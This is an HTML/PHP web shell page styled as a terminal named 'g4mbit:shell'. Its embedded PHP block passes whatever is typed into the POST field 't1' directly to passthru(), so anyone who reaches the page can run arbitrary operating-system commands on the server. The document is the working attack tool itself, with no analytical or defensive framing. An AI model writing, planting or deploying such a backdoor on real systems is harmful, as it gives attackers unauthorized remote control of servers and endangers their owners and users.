<html>
    <head>
        <meta charset="UTF-8" />
        <title>g4mbit:shell#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }
             *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }
            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }
            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }
            #shell {
                background: #000;
                max-width: 1000px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }
            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }
            #shell-logo {
                font-weight: bold;
                color: #D2171C;
                text-align: center;
            }
            @media (max-width: 991px) {
                #shell-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }
                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }
                #shell {
                    margin-top: 0;
                }
            }
            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }
            @media (max-width: 320px) {
                #shell-logo {
                    font-size: 5px;
                }
            }
            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }
            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(27, 201, 231, 1);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }
            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }
            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }
            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }
            #shell-input input {
                outline: none;
            }
        </style>
    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
   ____    _____          ___.    .__   __             .__             .__   .__ <span></span>   
  / ___\  /  |  |   _____ \_ |__  |__|_/  |_ /\  ______|  |__    ____  |  |  |  |<span></span>    
 / /_/  >/   |  |_ /     \ | __ \ |  |\   __\\/ /  ___/|  |  \ _/ __ \ |  |  |  |<span></span>    
 \___  //    ^   /|  Y Y  \| \_\ \|  | |  |  /\ \___ \ |   Y  \\  ___/ |  |__|  |__<span></span>  
/_____/ \____   | |__|_|  /|___  /|__| |__|  \//____  >|___|  / \___  >|____/|____/ <span></span> 
             |__|       \/     \/                   \/      \/      \/             <span></span> 
<?php
    if(isset($_POST['t1']))
    {
        $a=$_POST['t1']; //accessing value from the text field
        passthru($a);
    }
?>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">#</label>
                <div>
                    <form action="" method="post">
                        <input id="shell-cmd" name="t1" autofocus/>
                </div>
            </div>
            </form>
        </div>
    </body>
</html>